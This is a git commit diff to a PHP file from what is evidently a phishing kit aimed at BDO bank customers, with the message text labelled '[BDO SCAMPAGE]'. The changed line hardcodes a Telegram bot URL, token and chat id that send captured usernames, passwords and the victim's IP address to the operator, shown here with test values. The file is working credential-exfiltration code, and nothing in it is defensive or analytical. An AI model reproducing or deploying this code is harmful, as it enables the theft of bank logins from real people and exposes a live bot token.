be55fe8d8f0f941c2f412cf7ac3dad4fec1b2622
k4rd3r0 <54228691+k4rd3r0@users.noreply.github.com>
2023-02-25 15:04:07 +0800

    Update mes2.php

--- mes2.php
+++ mes2.php
@@ -7,7 +7,7 @@ $f1 = file_get_contents("https://api.telegram.org/bot6058365748:AAELIRCm9Y5_eiP9
 $url= 'https://example.com';
 
 $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $f1);
+    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot6058365748:AAELIRCm9Y5_eiP9PYAyKT9NJCLCSUQFmNU/sendMessage?chat_id=-1001702730889&text=%5BBDO+SCAMPAGE%5D+%0A%0A+%5B%2B%5D+TrueLog%3A+No%0A%5B%2B%5D+USERNAME%3A+test%0A%5B%2B%5D+Password%3A+test%0A%5B%2B%5D+IP%3A+136.158.48.6");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
